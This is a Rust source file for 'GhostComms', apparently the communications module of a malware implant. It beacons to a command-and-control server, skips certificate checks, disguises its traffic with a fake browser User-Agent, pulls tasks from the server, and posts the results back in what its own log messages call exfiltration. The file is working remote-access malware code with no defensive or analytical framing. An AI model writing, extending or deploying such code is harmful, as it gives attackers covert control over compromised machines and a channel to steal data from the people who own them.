use reqwest::{Client, header};
use serde_json::Value;
use log::{info, error};
// Removed unused SystemTime

// Import the macro directly from serde_json
use serde_json::json; 

pub struct GhostComms {
    client: Client,
    c2_url: String,
}

impl GhostComms {
    pub fn new(c2_url: String) -> Self {
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to create HTTP client");
            
        GhostComms { client, c2_url }
    }

    pub async fn send_heartbeat(&self, agent_id: &str) -> Result<Option<Value>, Box<dyn std::error::Error>> {
        let url = format!("{}/api/v1/heartbeat/{}", self.c2_url, agent_id);
        info!("Sending heartbeat to: {}", url);
        
        let resp = self.client.get(&url)
            .header(header::USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send()
            .await?;

        if resp.status().is_success() {
            let body: Value = resp.json().await?;
            info!("Heartbeat successful.");
            
            if let Some(tasks) = body.get("tasks").and_then(|t| t.as_array()) {
                if !tasks.is_empty() {
                    info!("Server returned {} pending task(s).", tasks.len());
                }
            }
            Ok(Some(body))
        } else {
            error!("Heartbeat failed with status: {}", resp.status());
            Err(format!("Server returned error: {}", resp.status()).into())
        }
    }

    pub async fn send_result(&self, agent_id: &str, task_id: &str, result: &Value) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/v1/result/{}", self.c2_url, agent_id);
        
        // Now json! macro is in scope
        let payload = json!({
            "agent_id": agent_id,
            "task_id": task_id,
            "result": result
        });

        let resp = self.client.post(&url)
            .header(header::CONTENT_TYPE, "application/json")
            .json(&payload)
            .send()
            .await?;

        if resp.status().is_success() {
            info!("Result successfully exfiltrated.");
            Ok(())
        } else {
            error!("Failed to exfiltrate result: {}", resp.status());
            Err("Exfiltration failed".into())
        }
    }
}
